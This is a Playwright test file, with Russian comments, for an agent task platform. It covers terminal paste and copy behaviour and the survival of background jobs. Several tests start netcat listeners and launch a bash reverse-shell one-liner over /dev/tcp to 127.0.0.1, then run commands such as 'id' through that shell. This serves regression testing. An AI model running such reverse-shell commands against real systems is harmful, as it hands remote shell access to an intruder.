import { test, expect, createTask, mockReset, openTask, send, termText, waitIdle, type Ids } from "./helpers";

// Регрессии живых сессий: (1) вставка Ctrl+Shift+V в пользовательский shell не должна дублироваться
// (ручной clipboard.readText + term.paste поверх родной вставки браузера в xterm-textarea);
// (2) reverse shell через job-листенер должен переживать обычные команды агента (их sweep),
// открытие пользовательского терминала и паузы — tmux-сессии jobs от этого умирать не должны.
type Call = { name: string; args: Record<string, unknown> };
const tt = (...rounds: Call[][]) => `[[tt:${Buffer.from(JSON.stringify({ rounds })).toString("base64url")}]] [[nomem]]`;
const sh = (command: string): Call => ({ name: "shell", args: { command } });

test.describe("стабильность shell-сессий", () => {
  let ids: Ids;
  test.beforeAll(async ({ request }) => { ids = await createTask(request, "Стабильность шеллов"); });
  test.beforeEach(async ({ request }) => { await mockReset(request); });

  test("вставка Ctrl+Shift+V в терминал вставляется один раз, не дважды", async ({ page }) => {
    test.setTimeout(120_000);
    await openTask(page, ids);
    await expect(page.getByTestId("term-shell")).toHaveAttribute("data-ws", "open", { timeout: 20_000 });
    await expect.poll(() => termText(page, "shell"), { timeout: 20_000 }).toMatch(/root@task-\w+/);
    await page.context().grantPermissions(["clipboard-read", "clipboard-write"], { origin: new URL(page.url()).origin });
    await page.evaluate(() => navigator.clipboard.writeText("echo WHPASTE42"));
    await page.getByTestId("term-shell").locator(".xterm-helper-textarea").focus();
    await page.keyboard.press("Control+Shift+V");
    await page.waitForTimeout(600);
    await page.keyboard.press("Enter");
    await expect.poll(async () => {
      const t = await termText(page, "shell");
      const lines = t.split("\n").map((l) => l.trim());
      return {
        standalone: lines.filter((l) => l === "WHPASTE42").length,
        glued: (t.match(/WHPASTE42echo/g) ?? []).length,
      };
    }, { timeout: 15_000 }).toEqual({ standalone: 1, glued: 0 });
  });

  test("копирование выделением работает и при заблокированном async clipboard (Brave режет writeText)", async ({ page }) => {
    test.setTimeout(120_000);
    // Brave может отклонять navigator.clipboard.writeText (разрешение на буфер) — тогда OSC52-копирование
    // обязано доехать legacy-путём execCommand, а не молча теряться.
    await page.addInitScript(() => {
      Object.defineProperty(navigator.clipboard, "writeText", {
        value: () => Promise.reject(new DOMException("blocked by test", "NotAllowedError")),
      });
    });
    await openTask(page, ids);
    await page.context().grantPermissions(["clipboard-read", "clipboard-write"], { origin: new URL(page.url()).origin });
    await expect(page.getByTestId("term-shell")).toHaveAttribute("data-ws", "open", { timeout: 20_000 });
    await expect.poll(() => termText(page, "shell"), { timeout: 20_000 }).toMatch(/root@task-\w+/);
    const term = page.getByTestId("term-shell");
    await term.locator(".xterm-helper-textarea").focus();
    await page.keyboard.type("echo COPY-BRAVE-$((40+2))");
    await page.keyboard.press("Enter");
    await expect.poll(() => termText(page, "shell")).toContain("COPY-BRAVE-42");
    await page.evaluate(() => navigator.clipboard.readText().catch(() => "")); // буфер мог держать старое — дальше поллим именно маркер
    const box = await term.locator(".xterm-screen").boundingBox();
    expect(box, "экран терминала виден").toBeTruthy();
    await page.mouse.move(box!.x + 6, box!.y + 6);
    await page.mouse.down();
    await page.mouse.move(box!.x + box!.width - 6, box!.y + box!.height - 6, { steps: 16 });
    await page.mouse.up();
    await expect.poll(() => page.evaluate(() => navigator.clipboard.readText()), { timeout: 10_000 }).toContain("COPY-BRAVE-42");
  });

  test("reverse shell в job-листенере живёт сквозь команды агента, пользовательский терминал и паузу", async ({ page, request }) => {
    test.setTimeout(240_000);
    const jobOut = async (jobId: string) =>
      (await (await request.get(`/api/tasks/${ids.task.id}/jobs/${jobId}/output?lines=120`)).json()).output as string;
    const jobIn = async (jobId: string, text: string) => {
      const r = await request.post(`/api/tasks/${ids.task.id}/jobs/${jobId}/input`, { data: { text } });
      expect(r.ok(), await r.text()).toBeTruthy();
    };

    const listener = await (await request.post(`/api/tasks/${ids.task.id}/jobs`, {
      data: { name: "listener-4444", command: "nc -lkvp 4444" },
    })).json();
    await expect.poll(() => jobOut(listener.id), { timeout: 20_000 }).toMatch(/listening/i);

    // «цель» из того же контейнера: настоящий интерактивный bash по TCP в листенер
    const target = await (await request.post(`/api/tasks/${ids.task.id}/jobs`, {
      data: { name: "target-sim", command: "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" },
    })).json();
    await jobIn(listener.id, "echo WHREV-$((20+22))");
    await expect.poll(() => jobOut(listener.id), { timeout: 20_000 }).toContain("WHREV-42");
    await jobIn(listener.id, "id");
    await expect.poll(() => jobOut(listener.id), { timeout: 20_000 }).toContain("uid=");

    // возмущения: обычная команда агента (execStream со sweep), пользовательский терминал, пауза
    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
    await openTask(page, { task: ids.task, chat });
    await send(page, tt([sh("echo DISTURB-AGENT")]));
    await waitIdle(page);
    await expect(page.getByTestId("term-shell")).toHaveAttribute("data-ws", "open", { timeout: 20_000 });
    await expect.poll(() => termText(page, "shell"), { timeout: 20_000 }).toMatch(/root@task-\w+/);
    await page.waitForTimeout(5000);

    await jobIn(listener.id, "echo STILL-ALIVE-$((6*7))");
    await expect.poll(() => jobOut(listener.id), { timeout: 20_000 }).toContain("STILL-ALIVE-42");
    const list = await (await request.get(`/api/tasks/${ids.task.id}/jobs`)).json();
    expect(list.find((j: any) => j.id === listener.id)?.running).toBe(true);
    expect(list.find((j: any) => j.id === target.id)?.running).toBe(true);

    // обрыв шелла (цель умерла/ресетнулась): с -k листенер слушает дальше и принимает следующий коннект
    await request.post(`/api/tasks/${ids.task.id}/jobs/${target.id}/stop`);
    await page.waitForTimeout(1000);
    const target2 = await (await request.post(`/api/tasks/${ids.task.id}/jobs`, {
      data: { name: "target-sim-2", command: "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" },
    })).json();
    await jobIn(listener.id, "echo AGAIN-$((100+1))");
    await expect.poll(() => jobOut(listener.id), { timeout: 20_000 }).toContain("AGAIN-101");

    await request.post(`/api/tasks/${ids.task.id}/jobs/${target2.id}/stop`);
    await request.post(`/api/tasks/${ids.task.id}/jobs/${listener.id}/stop`);
  });

  test("job_output диагностирует непринятое соединение в очереди одноразового листенера", async ({ request }) => {
    test.setTimeout(180_000);
    const mk = async (name: string, command: string) =>
      (await (await request.post(`/api/tasks/${ids.task.id}/jobs`, { data: { name, command } })).json()).id as string;
    const out = async (jobId: string) =>
      (await (await request.get(`/api/tasks/${ids.task.id}/jobs/${jobId}/output?lines=80`)).json()).output as string;
    const listener = await mk("nc-once-4447", "nc -lvnp 4447"); // без -k: второе соединение встанет в backlog
    const t1 = await mk("target-a", "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4447 0>&1'");
    await expect.poll(() => out(listener), { timeout: 20_000 }).toContain("Connection received");
    const t2 = await mk("target-b", "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4447 0>&1'");
    try {
      await expect.poll(() => out(listener), { timeout: 30_000 }).toContain("диагностика листенера");
      expect(await out(listener)).toContain("непринятое соединение");
    } finally {
      await request.post(`/api/tasks/${ids.task.id}/jobs/${t2}/stop`).catch(() => {});
      await request.post(`/api/tasks/${ids.task.id}/jobs/${t1}/stop`).catch(() => {});
      await request.post(`/api/tasks/${ids.task.id}/jobs/${listener}/stop`).catch(() => {});
    }
  });

  test("job_input «^C» реально прерывает команду в job, а не печатает два символа", async ({ request }) => {
    test.setTimeout(120_000);
    const job = await (await request.post(`/api/tasks/${ids.task.id}/jobs`, {
      data: { name: "sleeper", command: "sleep 100; echo NEVER-REACHED" },
    })).json();
    await new Promise((r) => setTimeout(r, 1000));
    const inp = await request.post(`/api/tasks/${ids.task.id}/jobs/${job.id}/input`, { data: { text: "^C", enter: false } });
    expect(inp.ok(), await inp.text()).toBeTruthy();
    // SIGINT дошёл: сессия завершилась или обёртка доложила rc — но не «спит молча дальше»
    await expect.poll(async () => {
      const list = await (await request.get(`/api/tasks/${ids.task.id}/jobs`)).json();
      const j = list.find((x: any) => x.id === job.id);
      const out = (await (await request.get(`/api/tasks/${ids.task.id}/jobs/${job.id}/output?lines=40`)).json()).output as string;
      return j?.running === false || out.includes("команда завершилась");
    }, { timeout: 15_000 }).toBe(true);
    const out = (await (await request.get(`/api/tasks/${ids.task.id}/jobs/${job.id}/output?lines=40`)).json()).output as string;
    expect(out).not.toContain("NEVER-REACHED");
  });
});
